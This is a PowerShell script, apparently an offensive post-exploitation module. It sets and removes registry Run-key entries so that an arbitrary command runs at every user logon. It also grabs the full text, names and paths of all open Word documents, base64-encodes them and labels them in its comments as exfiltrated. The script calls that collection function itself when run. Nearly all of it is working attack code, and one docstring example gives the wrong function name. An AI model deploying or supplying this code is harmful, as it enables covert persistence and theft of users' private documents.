$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

function Set-RegistryPersistence {
<#
.SYNOPSIS
Enables persistence through the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
.PARAMETER Name
Indicates the name to configure the entry in the registry.
.PARAMETER Command
Indicates the command to run in the startup when user log in.
.EXAMPLE
Set-RegistryPersistence -Name "EntryName" -Command "ScriptToExecute"
#>

    Param (
                
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command
        
    )

    New-ItemProperty -Path $RegistryPath -Name $Name -Value $Command -PropertyType String -Force | Out-Null
     
}

function Remove-RegistryPersistence {
<#
.SYNOPSIS
Remove persistence through the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
.PARAMETER Name
Indicates the name of the registry entry to delete.
.EXAMPLE
Remove-LocalSecurityPolicy -Name "EntryToDelete"
#>

    Param (
                    
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    Remove-ItemProperty -Path $RegistryPath -Name $Name -Force | Out-Null
     
}

function Get-OpenWORDDocumentsWords {
<#
.SYNOPSIS
Retrieve all WinWords open documents, get the title, the document path and exfiltrates all written words in base64
.EXAMPLE
Get-OpenWordDocumentsWords
#>
    try {
        $WordDocuments = [Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application')
    }
    catch {

    }
    finally {
        foreach ($Word in $WordDocuments.Documents) {
            
            $Exfil = "##-BEGIN-##" + "`n" + "Word_File: " + $Word.Name + "`n" + "Document_path: " + $Word.FullName + "`n" + "Words: " + "`n"
                    
            foreach ($Paragraph in $Word.Paragraphs) {
                if ($null -ne $Paragraph.range.Text) {
                    $Exfil += $Paragraph.range.Text
                }
            }
            $Exfil += "##-END-##"
            $b  = [System.Text.Encoding]::UTF8.GetBytes($exfil)
            $EncodedData = [System.Convert]::ToBase64String($b)
            Write-Host $EncodedData
        }
    }
}

Get-OpenWORDDocumentsWords